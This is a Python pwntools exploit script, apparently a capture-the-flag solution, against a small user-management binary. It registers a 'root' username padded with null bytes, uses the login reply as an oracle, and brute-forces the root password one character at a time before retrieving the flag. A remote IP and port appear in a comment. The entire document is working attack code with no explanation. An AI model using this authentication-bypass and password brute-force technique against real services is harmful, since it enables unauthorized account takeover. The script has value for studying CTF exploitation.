from pwn import *
def reg(name,password):
	r.sendline('1')
	r.recvuntil("Enter username: ")
	r.send(name)
	r.recvuntil("Enter password: ")
	r.send(password)
	r.recvuntil('Choice: ')
def delete(idx):
	r.sendline('4')
	r.recvuntil("User's ID: ")
	r.sendline(str(idx))
	r.recvuntil('Choice: ')
def login(name,password):
	r.sendline('2')
	r.recvuntil("Username: ")
	r.send(name)
	r.recvuntil("Password: ")
	r.send(password)
	return r.recvuntil('Choice: ')
def get_flag():
	r.sendline('5')
	print r.recv()
	
i = 28
password = ''
while i >= 0:
	r = process("rootme.censored")
	#r = remote('125.235.240.168', 27018)
	r.recvuntil('Choice: ')
	reg('a'*30,'b'*30)
	if i == 0:
		for c in range(32,127):
			payload = chr(c)+password[::-1]
			msg =  login('root\x00\x00',payload)
			if "Access Granted" in msg:
				password += chr(c)
				break
		password = password[::-1]
		print "password root: ",password
		login('root\x00\x00',password)
		get_flag()
	else:
		delete(9)
		p = 'A'*i
		reg('root\x00\x00',p)
		for c in range(32,127):
			payload = p+chr(c)+password[::-1]
			msg =  login('root\x00\x00',payload)			
			if "Access Granted" in msg:
				password += chr(c)
				break
	i -= 1	
	r.close()
